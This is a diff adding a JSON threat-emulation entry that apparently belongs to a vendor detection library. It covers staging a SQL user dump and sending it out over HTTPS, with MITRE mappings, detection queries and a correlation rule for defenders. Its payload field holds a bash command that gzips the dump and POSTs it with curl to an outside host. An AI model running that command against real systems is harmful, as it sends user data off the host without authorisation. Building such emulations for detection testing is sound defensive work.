@@ -1,0 +1,198 @@
+{
+  "id": "TTP-2026-0180",
+  "schema_version": "1.0.0",
+  "entry_version": "1.0.0",
+  "status": "active",
+  "metadata": {
+    "created_at": "2026-08-28T00:00:00Z",
+    "updated_at": "2026-08-28T00:00:00Z",
+    "authors": [
+      {
+        "name": "Henry Reed",
+        "email": "hreed@paloaltonetworks.com",
+        "role": "author"
+      }
+    ],
+    "tags": [
+      "dlp",
+      "cross-channel",
+      "correlation",
+      "database-dump",
+      "network-exfiltration"
+    ],
+    "source_refs": [
+      "SRC-UNIT42",
+      "SRC-MITRE-ATTACK"
+    ],
+    "pov_engine": {
+      "engine_version_min": "0.1.0",
+      "auto_load": true,
+      "simulation_class": "data-exfil",
+      "destructive": false,
+      "requires_network_egress": true,
+      "requires_internet": true,
+      "platforms": [
+        "linux",
+        "windows"
+      ],
+      "estimated_runtime_seconds": 45,
+      "cleanup_required": true,
+      "safety_class": "lab-only"
+    }
+  },
+  "identity": {
+    "name": "Cross-Channel DLP: Local SQL Database Staging Correlated to Network Exfiltration",
+    "summary": "Attacker creates local SQL dump containing users and PII, compresses it into a binary payload, and immediately initiates high-speed egress over HTTP/S.",
+    "description": "Multi-stage exfiltration operations often begin on endpoints with database extraction and conclude over network egress channels. Cortex XSIAM correlation engine connects local filesystem staging with network socket connections, aggregating isolated signals into a single high-priority data exfiltration incident.",
+    "severity": "critical",
+    "confidence": "high"
+  },
+  "threat_context": {
+    "actors": [
+      {
+        "name": "APT29",
+        "aliases": [
+          "Cozy Bear",
+          "Midnight Blizzard"
+        ]
+      }
+    ],
+    "campaigns": [
+      "Targeted Database Exfiltration"
+    ],
+    "industries_targeted": [
+      "technology",
+      "financial-services",
+      "healthcare"
+    ],
+    "first_observed": "2020-01-01"
+  },
+  "mitre_attack": {
+    "matrix": "enterprise",
+    "techniques": [
+      {
+        "technique_id": "T1048",
+        "name": "Exfiltration Over Alternative Protocol",
+        "tactic_ids": [
+          "TA0010"
+        ],
+        "tactic_names": [
+          "Exfiltration"
+        ]
+      },
+      {
+        "technique_id": "T1074",
+        "subtechnique_id": "T1074.001",
+        "name": "Data Staged: Local Data Staging",
+        "tactic_ids": [
+          "TA0009"
+        ],
+        "tactic_names": [
+          "Collection"
+        ]
+      },
+      {
+        "technique_id": "T1560",
+        "subtechnique_id": "T1560.001",
+        "name": "Archive Collected Data: Archive via Utility",
+        "tactic_ids": [
+          "TA0009"
+        ],
+        "tactic_names": [
+          "Collection"
+        ]
+      }
+    ],
+    "kill_chain_phase": "actions-on-objectives",
+    "data_sources": [
+      "File: File Creation",
+      "Network Traffic: Network Connection Creation"
+    ]
+  },
+  "execution": {
+    "target_platform": "linux",
+    "execution_framework": "custom-cortex",
+    "privilege_required": "user",
+    "prerequisites": [
+      {
+        "description": "Cortex XDR Endpoint Agent and Network Visibility enabled."
+      }
+    ],
+    "payload": {
+      "interpreter": "bash",
+      "code": "mkdir -p /tmp/cortex_dlp_cross\ngzip -c /tmp/cortex_dlp_cross/db_users_dump.sql > /tmp/cortex_dlp_cross/staged_payload.gz\ncurl -sk -X POST --data-binary @/tmp/cortex_dlp_cross/staged_payload.gz https://httpbin.org/post",
+      "timeout_seconds": 45
+    }
+  },
+  "detections": {
+    "biocs": [
+      {
+        "name": "Sql Dump Pii Staging",
+        "logic": "preset = xdr_data | filter event_type = 'FILE_WRITE' and action_file_name contains 'db_users_dump' and (action_file_path contains '/tmp/' or action_file_path contains 'AppData')",
+        "description": "Sql Dump Pii Staging",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1048",
+          "T1074",
+          "T1560"
+        ]
+      },
+      {
+        "name": "Compressed Staging Payload",
+        "logic": "preset = xdr_data | filter event_type = 'FILE_WRITE' and action_file_name contains 'staged_payload.gz'",
+        "description": "Compressed Staging Payload",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1048",
+          "T1074",
+          "T1560"
+        ]
+      }
+    ],
+    "xql_queries": [
+      {
+        "name": "Staged Database Exfiltration Cross-Channel",
+        "query": "dataset = xdr_data | filter (event_type = 'FILE_WRITE' and action_file_name contains '.sql') or (event_type = 'NETWORK' and action_process_image_name in ('curl', 'wget')) | comp count() as stages by agent_hostname, actor_process_username | filter stages >= 2",
+        "purpose": "hunt"
+      }
+    ],
+    "correlation_rules": [
+      {
+        "rule_id": "CR-DLP-0004",
+        "name": "cr-cross-channel-dlp-stitch",
+        "logic": "Sequence: File Write (SQL Dump) -> File Write (GZIP) -> Network Egress within 300s by same process lineage"
+      }
+    ]
+  },
+  "panw_mapping": {
+    "products": [
+      {
+        "module": "cortex-xdr",
+        "coverage_tier": "detection",
+        "rule_ids": [
+          "XDR-BIOC-SQL-STAGING"
+        ],
+        "license_required": "pro",
+        "evidence_query": "preset = xdr_data | filter action_file_name = 'db_users_dump.sql'"
+      },
+      {
+        "module": "cortex-xsiam",
+        "coverage_tier": "detection",
+        "rule_ids": [
+          "XSIAM-CR-CROSS-CHANNEL-DLP"
+        ],
+        "license_required": "advanced",
+        "evidence_query": "dataset = xdr_data | filter action_process_command_line contains 'staged_payload.gz'"
+      }
+    ]
+  },
+  "references": [
+    {
+      "title": "Unit 42 - Multi-Vector Data Exfiltration & APT Operations",
+      "url": "https://unit42.paloaltonetworks.com/data-exfiltration-vectors/",
+      "publisher": "Unit 42",
+      "publisher_id": "SRC-UNIT42",
+      "primary": true
+    }
+  ]
+}
